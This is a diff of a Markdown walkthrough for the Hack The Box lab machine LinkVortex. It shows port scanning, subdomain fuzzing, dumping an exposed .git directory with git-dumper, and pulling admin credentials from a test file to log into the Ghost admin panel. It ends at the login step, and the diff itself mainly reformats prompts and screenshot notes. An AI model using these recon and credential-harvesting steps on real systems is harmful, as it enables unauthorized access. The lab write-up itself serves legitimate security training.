@@ -5,8 +5,8 @@ Difficulty: Easy
 ## Steps
 ### Recon
 ```Bash
-[us-vip-2][10.10.14.28][gntsqid@htb-tnbwsejwe9][~]
- []$ nmap -T5 -p- --min-rate=1500 -sV -Pn link.htb
+┌─[us-vip-2]─[10.10.14.28]─[gntsqid@htb-tnbwsejwe9]─[~]
+└──╼ [★]$ nmap -T5 -p- --min-rate=1500 -sV -Pn link.htb
 Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-13 18:25 CST
 Warning: 10.10.11.47 giving up on port because retransmission cap hit (2).
 Nmap scan report for link.htb (10.10.11.47)
@@ -36,12 +36,14 @@ Nmap done: 1 IP address (1 host up) scanned in 51.13 seconds
 ```
 quick UDP scan for sanity: nothing found.
 
-[screenshot]
+
+> **Unavailable screenshot:** image. [Original GitHub attachment](https://github.com/user-attachments/assets/cb81c675-361f-4ffa-a6c5-100cb560bd92) returned 404 during the image audit (2026-10-08).
+
 
 Running Nuclei:
 ```Bash
-[us-vip-2][10.10.14.28][gntsqid@htb-mnlibwppso][~]
- []$ nuclei -target http://10.10.11.47
+┌─[us-vip-2]─[10.10.14.28]─[gntsqid@htb-mnlibwppso]─[~]
+└──╼ [★]$ nuclei -target http://10.10.11.47
 
                      __     _
    ____  __  _______/ /__  (_)
@@ -67,8 +69,8 @@ Running Nuclei:
 ```
 FFUF:
 ```Bash
-[us-vip-2][10.10.14.28][gntsqid@htb-mnlibwppso][~]
- []$ ffuf -u http://linkvortex.htb -w /usr/share/wordlists/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -H "Host: FUZZ.linkvortex.htb" -mc 200
+┌─[us-vip-2]─[10.10.14.28]─[gntsqid@htb-mnlibwppso]─[~]
+└──╼ [★]$ ffuf -u http://linkvortex.htb -w /usr/share/wordlists/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -H "Host: FUZZ.linkvortex.htb" -mc 200
 
         /'___\  /'___\           /'___\       
        /\ \__/ /\ \__/  __  __  /\ \__/       
@@ -95,17 +97,20 @@ dev                     [Status: 200, Size: 2538, Words: 670, Lines: 116, Durati
 :: Progress: [100000/100000] :: Job [1/1] :: 617 req/sec :: Duration: [0:02:43] :: Errors: 0 ::
 ```
 we can see as a result we have *dev.linkvortex.htb*\
-[screenshot]
+
+
+> **Unavailable screenshot:** image. [Original GitHub attachment](https://github.com/user-attachments/assets/922226cb-b96e-45d6-91b5-848fa3aaba76) returned 404 during the image audit (2026-10-08).
+
 
 Going to use [git dumper](https://github.com/arthaud/git-dumper) for the next part:
 ```Bash
 pip3 install git-dumper
 ```
 ```Bash
-[us-vip-2][10.10.14.28][gntsqid@htb-mnlibwppso][~]
- []$ mkdir git-dumper
-[us-vip-2][10.10.14.28][gntsqid@htb-mnlibwppso][~]
- []$ git-dumper http://dev.linkvortex.htb/.git ./git-dumper/
+┌─[us-vip-2]─[10.10.14.28]─[gntsqid@htb-mnlibwppso]─[~]
+└──╼ [★]$ mkdir git-dumper
+┌─[us-vip-2]─[10.10.14.28]─[gntsqid@htb-mnlibwppso]─[~]
+└──╼ [★]$ git-dumper http://dev.linkvortex.htb/.git ./git-dumper/
 [-] Testing http://dev.linkvortex.htb/.git/HEAD [200]
 [-] Testing http://dev.linkvortex.htb/.git/ [200]
 [-] Fetching .git recursively
@@ -152,20 +157,20 @@ pip3 install git-dumper
 Updated 5596 paths from the index
 ```
 ```Bash
-[us-vip-2][10.10.14.28][gntsqid@htb-mnlibwppso][~/git-dumper]
- []$ ls
+┌─[us-vip-2]─[10.10.14.28]─[gntsqid@htb-mnlibwppso]─[~/git-dumper]
+└──╼ [★]$ ls
 apps  Dockerfile.ghost  ghost  LICENSE  nx.json  package.json  PRIVACY.md  README.md  SECURITY.md  yarn.lock
 ```
 We see that *Ghost* is being used.
 ```Bash
-[us-vip-2][10.10.14.28][gntsqid@htb-mnlibwppso][~/git-dumper]
- []$ cat authentication.test.js|grep -i pass -B 1
+┌─[us-vip-2]─[10.10.14.28]─[gntsqid@htb-mnlibwppso]─[~/git-dumper]
+└──╼ [★]$ cat authentication.test.js|grep -i pass -B 1
 cat: authentication.test.js: No such file or directory
-[us-vip-2][10.10.14.28][gntsqid@htb-mnlibwppso][~/git-dumper]
- []$ find ./ -name "authentication.test.js"
+┌─[us-vip-2]─[10.10.14.28]─[gntsqid@htb-mnlibwppso]─[~/git-dumper]
+└──╼ [★]$ find ./ -name "authentication.test.js"
 ./ghost/core/test/regression/api/admin/authentication.test.js
-[us-vip-2][10.10.14.28][gntsqid@htb-mnlibwppso][~/git-dumper]
- []$ cat ./ghost/core/test/regression/api/admin/authentication.test.js | grep -i pass -B 1
+┌─[us-vip-2]─[10.10.14.28]─[gntsqid@htb-mnlibwppso]─[~/git-dumper]
+└──╼ [★]$ cat ./ghost/core/test/regression/api/admin/authentication.test.js | grep -i pass -B 1
             const email = 'test@example.com';
             const password = 'OctopiFociPilfer45';
 --
@@ -175,20 +180,8 @@ cat: authentication.test.js: No such file or directory
 We can see credentials *admin:OctopiFociPilfer45*
 
 Go to *http://linkvortex.htb/ghost/* and sign in with the above creds:\
-[screenshot]
 
 
-
-
-
-
-
-
-
-
-
-
-
-
+> **Unavailable screenshot:** image. [Original GitHub attachment](https://github.com/user-attachments/assets/efaa1e81-862c-43f3-8db5-d1ae1c11afe5) returned 404 during the image audit (2026-10-08).
 
 
